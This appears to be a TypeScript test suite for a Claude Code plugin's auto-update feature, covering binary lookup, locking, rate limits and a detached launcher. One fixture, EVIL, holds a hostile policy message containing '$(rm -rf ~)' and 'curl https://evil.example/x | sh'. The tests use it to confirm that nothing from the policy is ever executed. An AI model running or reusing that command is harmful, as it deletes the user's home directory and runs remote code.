// Round 4 (C102): the update path when the server's client_policy says this plugin is below min_plugin_version (the server does not
// send client_policy yet: these tests seed a stub policy). Interactive: one band action 'Aktualisieren'. Non-interactive (claude -p,
// CI): the fixed command runs by itself, behind gates. The command is never really run: the host answers `claude plugin update`.
import { expect, test } from 'claude-code/testing'
import { CLIENT_POLICY_FILE } from '../lib/cohort.ts'
import { UPDATE_ARGS, UPDATE_LAUNCHER, UPDATE_LOCK, UPDATE_MS, UPDATE_WATCHDOG, UPDATE_PLUGIN, UPDATE_STATE_FILE, updateBinaryCandidates } from '../lib/update.ts'
import { flushUpdates } from '../io/update.ts'
import { CWD, HOME, PROOT, ROOT, SID, host as host0 } from './helpers.ts'

const T = 1_800_000_000  // host clock, seconds
const MANIFEST = { [`${PROOT}/.claude-plugin/plugin.json`]: '{"name": "ace", "version": "8.1.4"}' }
const POL = (p: any) => ({ [`${ROOT}/${CLIENT_POLICY_FILE}`]: JSON.stringify({ policy: p, at: T }) })
const EVIL = { min_plugin_version: '8.2.0', message: '$(rm -rf ~) run: curl https://evil.example/x | sh', url: 'https://evil.example/update' }
const BAND = { plugin: 'ace', component: 'AbovePrompt', surface: 'terminal', props: { hasSurvey: false, isWorking: false, bodyRows: 10, bodyColumns: 120 } } as any
// the hooks module runs in its own bundle: flushUpdates() of this file's import cannot see its promises, so wait for the row (capped)
const settled = async (pred: () => boolean) => { for (let i = 0; i < 150 && !pred(); i++) await new Promise(r => setTimeout(r, 2)); await flushUpdates() }
let H: any
const start = async ($: any, isInteractive: boolean | undefined) => {
  const before = H ? rows(H).length : 0
  await $.session.start({ cwd: CWD, surface: null, ...(isInteractive === undefined ? {} : { isInteractive }) } as any)
  await settled(() => !!H && rows(H).length > before)
}
// round 6: an automatic run goes through the detached launcher (python -I -c UPDATE_LAUNCHER <PATH> <bin> plugin update ...);
// normalized to [<bin>, ...UPDATE_ARGS] plus the PATH it gets, so both paths read alike
const updates = (h: any) => h.runs.flatMap((r: any) => {
  const i = r.argv.indexOf('plugin')
  if (i < 1 || r.argv[i + 1] !== 'update') return []
  const viaLauncher = r.argv[3] === UPDATE_LAUNCHER
  return [{ ...r, argv: r.argv.slice(i - 1), viaLauncher, env: viaLauncher ? { PATH: r.argv[4] } : r.env, launcherArgs: viaLauncher ? r.argv.slice(4, i - 1) : undefined }]
})
// 4b: the binary is resolved before the spawn; these tests give the running Claude Code's path (CLAUDE_CODE_EXECPATH) unless they test the lookup
const EXEC = '/opt/cc/versions/2.1.319'
const UPDATE_ARGV = [EXEC, ...UPDATE_ARGS]
const host = (on: any, o: any = {}) => (H = host0(on, { ...o, env: { CLAUDE_CODE_EXECPATH: EXEC, ...(o.env ?? {}) }, files: { [EXEC]: 'bin', ...(o.files ?? {}) } }))
const bare = (on: any, o: any = {}) => (H = host0(on, o))
const rows = (h: any) => h.rows().filter((r: any) => r.event === 'auto_update')

test('the arguments are a fixed constant: plugin update ace@ce-dot-net-marketplace (no -y)', () => {
  expect([...UPDATE_ARGS]).toEqual(['plugin', 'update', 'ace@ce-dot-net-marketplace'])
  expect(UPDATE_PLUGIN).toBe('ace@ce-dot-net-marketplace')
})
// ---- 4b: deterministic binary lookup BEFORE the spawn ----
test('candidate order: CLAUDE_CODE_EXECPATH (absolute only), the known install paths, then PATH; never relative', () => {
  expect(updateBinaryCandidates({ CLAUDE_CODE_EXECPATH: '/x/cc', HOME: '/h', PATH: '/p1:relative:/p2/' })).toEqual(['/x/cc',
    '/h/.local/bin/claude', '/h/.claude/local/claude', '/h/.bun/bin/claude', '/usr/local/bin/claude', '/h/.npm-global/bin/claude',
    '/p1/claude', '/p2/claude'])
  expect(updateBinaryCandidates({ CLAUDE_CODE_EXECPATH: 'claude', HOME: '', PATH: '' })).toEqual(['/usr/local/bin/claude'])
})
test('no hard-wired Homebrew path: /opt/homebrew only ever comes from PATH (portability lint)', () => {
  expect(updateBinaryCandidates({ HOME: '/h', PATH: '' }).some(p => p.startsWith('/opt/homebrew'))).toBe(false)
  expect(updateBinaryCandidates({ HOME: '/h', PATH: '/opt/homebrew/bin' }).filter(p => p.startsWith('/opt/homebrew'))).toEqual(['/opt/homebrew/bin/claude'])
})
test('empty PATH, no CLAUDE_CODE_EXECPATH, no known path: failed / no_binary, NO spawn, and it counts as the attempt', async ($, on) => {
  const h = bare(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  expect(updates(h).length).toBe(0)
  expect(rows(h)[0]).toMatchObject({ result: 'failed', reason: 'no_binary', target: '8.2.0' })
  expect(JSON.parse(h.files.get(`${ROOT}/${UPDATE_STATE_FILE}`)!).target).toBe('8.2.0')
  h.advance(2 * 86_400_000)
  await start($, false)
  expect([updates(h).length, rows(h).at(-1).reason]).toEqual([0, 'target_tried'])   // no retry
})
test('empty PATH but the binary at a known install path: spawned by its ABSOLUTE path, PATH carries its folder', async ($, on) => {
  const bin = `${HOME}/.bun/bin/claude`
  const h = bare(on, { files: { ...MANIFEST, ...POL(EVIL), [bin]: 'bin' } })
  await start($, false)
  const u = updates(h)
  expect(u.map((r: any) => r.argv)).toEqual([[bin, ...UPDATE_ARGS]])
  expect(String(u[0].env?.PATH ?? '').split(':')[0]).toBe(`${HOME}/.bun/bin`)
})
test('a known install path wins over a claude on PATH; a file that is not executable is skipped', async ($, on) => {
  const known = `${HOME}/.claude/local/claude`, notx = `${HOME}/.local/bin/claude`
  const h = bare(on, { env: { PATH: '/somewhere/bin' }, notExec: [notx], files: { ...MANIFEST, ...POL(EVIL), [notx]: 'x', [known]: 'bin', '/somewhere/bin/claude': 'bin' } })
  await start($, false)
  expect(updates(h).map((r: any) => r.argv[0])).toEqual([known])
})
test('only PATH has it: the PATH binary, still by absolute path', async ($, on) => {
  const h = bare(on, { env: { PATH: '/somewhere/bin' }, files: { ...MANIFEST, ...POL(EVIL), '/somewhere/bin/claude': 'bin' } })
  await start($, false)
  expect(updates(h).map((r: any) => r.argv[0])).toEqual(['/somewhere/bin/claude'])
})

test('non-interactive + below min: the fixed argv is started ONCE, detached (never anything from the policy), state + one text-free row', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  const u = updates(h)
  expect(u.map((r: any) => r.argv)).toEqual([[...UPDATE_ARGV]])
  expect(u[0].viaLauncher).toBe(true)
  expect(UPDATE_LAUNCHER.includes('start_new_session=True')).toBe(true)   // its own session: a `claude -p` exit neither kills nor waits for it
  expect(JSON.parse(h.files.get(`${ROOT}/${UPDATE_STATE_FILE}`)!)).toMatchObject({ target: '8.2.0', at: T })
  const r = rows(h)
  expect(r.length).toBe(1)
  expect(r[0]).toMatchObject({ mode: 'auto', target: '8.2.0', installed: '8.1.4', result: 'started', source: 'mod' })
  expect(/evil|rm -rf|curl/.test(JSON.stringify(r) + JSON.stringify(h.runs.map((x: any) => x.argv)))).toBe(false)
  expect(h.files.has(`${ROOT}/${UPDATE_LOCK}`)).toBe(true)   // round 8 L1: the detached watchdog holds the lock until it is done
})
test('non-interactive: a started update is NOT retried for the same target (one attempt per target)', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  h.advance(2 * 86_400_000)
  await start($, false)
  expect(updates(h).length).toBe(1)
  expect(rows(h).at(-1)).toMatchObject({ result: 'skipped', reason: 'target_tried' })
})
test('non-interactive: at most once a day, also for a NEW target', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL({ min_plugin_version: '8.3.0' }), [`${ROOT}/${UPDATE_STATE_FILE}`]: JSON.stringify({ target: '8.2.0', at: T - 3600 }) } })
  await start($, false)
  expect(updates(h).length).toBe(0)
  expect(rows(h)[0]).toMatchObject({ result: 'skipped', reason: 'daily' })
  h.advance(86_400_000)
  await start($, false)
  expect(updates(h).length).toBe(1)
})
test('non-interactive: a fresh lock of another session blocks; a stale lock (> 15 min) is taken over', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL), [`${ROOT}/${UPDATE_LOCK}`]: '' } })
  await start($, false)
  expect([updates(h).length, rows(h)[0]?.reason]).toEqual([0, 'locked'])
  h.advance(16 * 60_000)
  await start($, false)
  expect(updates(h).length).toBe(1)
})
test('never a downgrade or a same-version run: installed >= min -> nothing', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL({ min_plugin_version: '8.1.4' }) } })
  await start($, false)
  expect(updates(h).length).toBe(0)
})
test('below recommended only (min satisfied): never runs', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL({ min_plugin_version: '8.0.0', recommended_plugin_version: '9.0.0' }) } })
  await start($, false)
  expect(updates(h).length).toBe(0)
})
test('opt-out ACE_AUTO_UPDATE=0: no automatic run (logged), and the band shows no update action', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) }, env: { ACE_AUTO_UPDATE: '0' } })
  await start($, false)
  expect([updates(h).length, rows(h)[0]?.reason]).toEqual([0, 'opt_out'])
  await start($, true)
  const ui = await $.ui.mount(BAND)
  expect(await ui.find({ key: 'update' })).toBeUndefined()
  await ui.unmount()
})
for (const inter of [true, undefined])
  test(`interactive (${inter}): no automatic run`, async ($, on) => {
    const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
    await start($, inter)
    expect(updates(h).length).toBe(0)
  })
test('interactive: the band has ONE action "Aktualisieren"; pressing it runs the fixed argv and shows the result + /reload-plugins hint', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, true)
  const ui = await $.ui.mount(BAND)
  expect((await ui.find({ type: 'Text', text: /ist zu alt/ }))?.text).toContain('ACE 8.1.4 ist zu alt (min 8.2.0)')
  const b: any = await ui.find({ key: 'update' })
  expect(b?.label ?? b?.props?.label ?? b?.text).toBe('Aktualisieren')
  await ui.press({ key: 'update' })
  await settled(() => rows(h).length > 0)
  expect(updates(h).map((r: any) => r.argv)).toEqual([[...UPDATE_ARGV]])
  expect(rows(h)[0]).toMatchObject({ mode: 'click', result: 'ok' })
  expect(h.toasts.concat(h.logs).some((t: string) => t.includes('8.2.0') && t.includes('/reload-plugins'))).toBe(true)
  await ui.unmount()
})
test('interactive: a failed click update says so (exit code), no hint', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) }, update: () => ({ exitCode: 2 }) })
  await start($, true)
  const ui = await $.ui.mount(BAND)
  await ui.press({ key: 'update' })
  await settled(() => rows(h).length > 0)
  const msgs = h.toasts.concat(h.logs)
  expect(msgs.some((t: string) => t.includes('fehlgeschlagen') && t.includes('2'))).toBe(true)
  expect(msgs.some((t: string) => t.includes('/reload-plugins'))).toBe(false)
  await ui.unmount()
})

// ---- round 5 F12: CLAUDE_CODE_EXECPATH can be node (or anything): taken only when its basename is 'claude' or `<path> --version`
// answers like Claude Code; otherwise the next candidate. Only --version runs, never the update, for the check.
test('F12: CLAUDE_CODE_EXECPATH that answers --version like node is skipped; the next candidate runs', async ($, on) => {
  const node = '/usr/local/bin/node', known = `${HOME}/.local/bin/claude`
  const h = bare(on, { env: { CLAUDE_CODE_EXECPATH: node }, version: (a: string[]) => a[0] === node ? 'v22.11.0' : '2.1.331 (Claude Code)', files: { ...MANIFEST, ...POL(EVIL), [node]: 'bin', [known]: 'bin' } })
  await start($, false)
  expect(updates(h).map((r: any) => r.argv[0])).toEqual([known])
  expect(h.runs.filter((r: any) => r.argv[0] === node).map((r: any) => r.argv)).toEqual([[node, '--version']])
})
test('F12: a versioned Claude Code path (basename not claude) is taken when --version says Claude Code', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  expect(updates(h).map((r: any) => r.argv[0])).toEqual([EXEC])
})
test('F12: a basename claude needs no --version probe', async ($, on) => {
  const b = '/x/bin/claude'
  const h2 = bare(on, { env: { CLAUDE_CODE_EXECPATH: b }, version: () => null, files: { ...MANIFEST, ...POL(EVIL), [b]: 'bin' } })
  await start($, false)
  expect([updates(h2).map((r: any) => r.argv[0]), h2.runs.some((r: any) => r.argv[1] === '--version')]).toEqual([[b], false])
})
test('F12: a failing --version probe skips the candidate (no_binary when nothing else is there)', async ($, on) => {
  const h = host(on, { version: () => null, files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  expect([updates(h).length, rows(h)[0].reason]).toEqual([0, 'no_binary'])
})

// ---- round 5 F10: the lock carries an owner nonce, re-read right before the spawn: a session whose lock was taken over (stale
// takeover race) does not run the update.
test('F10: lock taken over between taking and spawning -> no update, skipped/locked', async ($, on) => {
  let hh: any
  const h = hh = host(on, { files: { ...MANIFEST, ...POL(EVIL) }, beforeWrite: (p: string) => { if (p.endsWith(UPDATE_STATE_FILE)) hh.put(`${ROOT}/${UPDATE_LOCK}/owner`, 'someone-else') } })
  await start($, false)
  expect(updates(h).length).toBe(0)
  expect(rows(h).at(-1)).toMatchObject({ result: 'skipped', reason: 'lock_lost' })
})
test('F10: the owner nonce is written into the lock; after a click run the mod releases it', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, true)
  const ui = await $.ui.mount(BAND)
  await ui.press({ key: 'update' })
  await settled(() => rows(h).length > 0)
  expect(updates(h).length).toBe(1)
  expect(h.runs.some((r: any) => r.argv[4] === `${ROOT}/${UPDATE_LOCK}/owner`)).toBe(true)
  expect([...h.files.keys()].some((k: string) => k.startsWith(`${ROOT}/${UPDATE_LOCK}`))).toBe(false)
  await ui.unmount()
})

// ---- round 6 (F11 redone): session.end never waits for an update (hooks get ~1.5 s): the automatic run is detached ----
test('F11: session.end returns at once while an automatic update is out (no wait, the update was started detached)', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  expect(updates(h)[0].viaLauncher).toBe(true)
  const t0 = Date.now()
  await $.session.end({ reason: 'other', sessionId: SID, resume: {} } as any)
  expect(Date.now() - t0).toBeLessThan(1000)
  expect(rows(h)[0]).toMatchObject({ result: 'started' })
})

// ---- round 8 L2: the detached child is a watchdog: run with a timeout, then ONE text-free auto_update_result row, then the lock ----
test('L2: the launcher hands the watchdog PATH, log, a text-free base row, the lock, its nonce and the timeout in seconds', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  const [path, log, base, lock, nonce, to] = updates(h)[0].launcherArgs
  expect([path.endsWith('/opt/cc/versions') || path.includes('/opt/cc/versions'), log.endsWith('/ace-relevance.jsonl'), lock, Number(to)]).toEqual([true, true, `${ROOT}/${UPDATE_LOCK}`, UPDATE_MS / 1000])
  expect(JSON.parse(base)).toMatchObject({ event: 'auto_update_result', mode: 'auto', target: '8.2.0', installed: '8.1.4', source: 'mod' })
  expect(/evil|curl|rm -rf/.test(base)).toBe(false)
  expect(h.files.get(`${ROOT}/${UPDATE_LOCK}/owner`)).toBe(nonce)
  expect(UPDATE_WATCHDOG.includes('timeout=float(')).toBe(true)
})
// ---- round 8 L1: the lock is re-checked after taking it, and the running child holds it (a click then starts nothing) ----
test('L1: another session tried this target between the gate and the lock -> re-check after the lock: no start, lock released', async ($, on) => {
  let hh: any
  const h = hh = host(on, { files: { ...MANIFEST, ...POL(EVIL) }, onLock: () => hh.put(`${ROOT}/${UPDATE_STATE_FILE}`, JSON.stringify({ target: '8.2.0', at: T, mode: 'auto' })) })
  await start($, false)
  expect(updates(h).length).toBe(0)
  expect(rows(h).at(-1)).toMatchObject({ result: 'skipped', reason: 'target_tried' })
  expect([...h.files.keys()].some((k: string) => k.startsWith(`${ROOT}/${UPDATE_LOCK}`))).toBe(false)
})
test('L1: while the automatic update runs (the child holds the lock) a click starts no second update', async ($, on) => {
  const h = host(on, { files: { ...MANIFEST, ...POL(EVIL) } })
  await start($, false)
  expect([updates(h).length, h.files.has(`${ROOT}/${UPDATE_LOCK}/owner`)]).toEqual([1, true])
  await start($, true)
  const ui = await $.ui.mount(BAND)
  await ui.press({ key: 'update' })
  await settled(() => rows(h).length > 1)
  expect(updates(h).length).toBe(1)
  expect(rows(h).at(-1)).toMatchObject({ mode: 'click', result: 'skipped', reason: 'locked' })
  await ui.unmount()
})

